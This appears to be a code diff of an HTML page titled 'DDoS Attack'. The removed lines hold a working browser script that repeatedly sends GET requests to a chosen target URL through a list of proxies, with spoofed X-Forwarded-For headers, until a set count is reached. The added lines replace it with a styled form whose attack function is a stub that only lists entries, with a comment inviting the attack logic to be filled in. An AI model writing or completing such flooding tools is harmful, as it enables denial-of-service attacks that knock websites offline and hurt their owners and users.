@@ -1,81 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DDoS Attack</title>
-<script>
-    var attackCount = 0;
-
-    function updateOutput(message) {
-        var output = document.getElementById("output");
-        output.innerHTML += '<span style="color: green;">' + message + '</span><br>';
-    }
-
-    function sendAttackRequest(targetUrl, proxy) {
-        return new Promise(function(resolve, reject) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", targetUrl);
-            xhr.setRequestHeader("X-Forwarded-For", proxy);
-            xhr.onload = function() {
-                if (xhr.status >= 200 && xhr.status < 300) {
-                    resolve(xhr.responseText);
-                } else {
-                    reject(xhr.statusText);
-                }
-            };
-            xhr.onerror = function() {
-                reject(xhr.statusText);
-            };
-            xhr.send();
-        });
-    }
-
-    function performAttack(duration, targetUrl, proxies) {
-        attackCount++;
-        updateOutput("Attack #" + attackCount);
-
-        var promises = [];
-        for (var i = 0; i < proxies.length; i++) {
-            // Use each proxy to send attack requests
-            promises.push(sendAttackRequest(targetUrl, proxies[i]));
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Attack</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
         }
-
-        Promise.all(promises).then(function() {
-            if (attackCount * proxies.length >= duration) {
-                updateOutput("Attack finished.");
-                return;
-            }
-            setTimeout(function() {
-                performAttack(duration, targetUrl, proxies);
-            }, 1000);
-        });
-    }
-
-    function startAttack() {
-        var targetUrl = document.getElementById("targetUrl").value;
-        var duration = parseInt(document.getElementById("duration").value);
-        var proxyString = document.getElementById("proxy").value;
-        var proxies = proxyString.split("\n");
-        performAttack(duration, targetUrl, proxies);
-    }
-</script>
+        .container {
+            margin-top: 50px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: inline-block;
+            width: 150px;
+            font-weight: bold;
+        }
+        .input-group input[type="number"] {
+            width: 100px;
+            padding: 5px;
+            margin-left: 10px;
+        }
+        .input-group button {
+            padding: 5px 10px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 3px;
+        }
+        .attacks {
+            margin-top: 20px;
+            text-align: left;
+        }
+    </style>
 </head>
 <body>
-<h1>DDoS Attack</h1>
-<label for="targetUrl">Target URL:</label><br>
-<input type="text" id="targetUrl" value="https://example.com"><br><br>
+    <div class="container">
+        <h2>DDoS Attack</h2>
+        <div class="input-group">
+            <label for="url">URL:</label>
+            <input type="text" id="url">
+        </div>
+        <div class="input-group">
+            <label for="duration">Duration (seconds):</label>
+            <input type="number" id="duration">
+        </div>
+        <div class="input-group">
+            <button onclick="startAttack()">Start Attack</button>
+        </div>
+        <div class="input-group">
+            <label for="speed">Speed Level:</label>
+            <input type="number" id="speed" min="1" max="10">
+        </div>
+        <div class="attacks">
+            <h3>Attacks:</h3>
+            <ul id="attack-list">
+            </ul>
+        </div>
+    </div>
 
-<label for="duration">Attack Duration (seconds):</label><br>
-<input type="number" id="duration" value="60"><br><br>
-
-<label for="proxy">Proxies (one per line):</label><br>
-<textarea id="proxy" rows="5">Proxy1:Port1
-Proxy2:Port2
-Proxy3:Port3</textarea><br><br>
-
-<button onclick="startAttack()">Start Attack</button><br><br>
-
-<div id="output"></div>
+    <script>
+        function startAttack() {
+            // Your attack logic here
+            var url = document.getElementById("url").value;
+            var duration = document.getElementById("duration").value;
+            var speed = document.getElementById("speed").value;
+            // Display the attack in the list
+            var attackList = document.getElementById("attack-list");
+            var attackItem = document.createElement("li");
+            attackItem.textContent = "Attacking " + url + " for " + duration + " seconds with speed level " + speed;
+            attackList.appendChild(attackItem);
+        }
+    </script>
 </body>
 </html>
